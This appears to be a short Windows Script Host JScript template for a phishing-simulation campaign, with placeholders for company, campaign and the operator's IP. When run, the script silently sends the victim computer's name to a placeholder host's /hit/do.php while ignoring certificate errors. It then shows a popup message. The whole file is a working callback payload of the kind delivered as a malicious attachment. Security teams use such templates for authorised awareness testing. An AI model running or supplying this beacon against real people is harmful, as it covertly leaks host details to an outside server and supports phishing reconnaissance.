var title = "COMPANY NAME";
var message = "Some text\r\nMore text."
var campaign = "CAMPAIGN NAME";
var baseURL = "https://YOUR_IP/hit/do.php";
 
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
var network = new ActiveXObject('WScript.Network');
 
var temp = WinHttpReq.Open("GET", baseURL+"?name="+network.computerName+"&campaign="+campaign, false);
WinHttpReq.Option(4) = 0x3300;
 
WinHttpReq.Send();
 
var strResult = WinHttpReq.ResponseText;
WScript.Sleep(1500);
 
var WshShell = WScript.CreateObject("WScript.Shell");
var BtnCode = WshShell.Popup(message,9999, title ,64);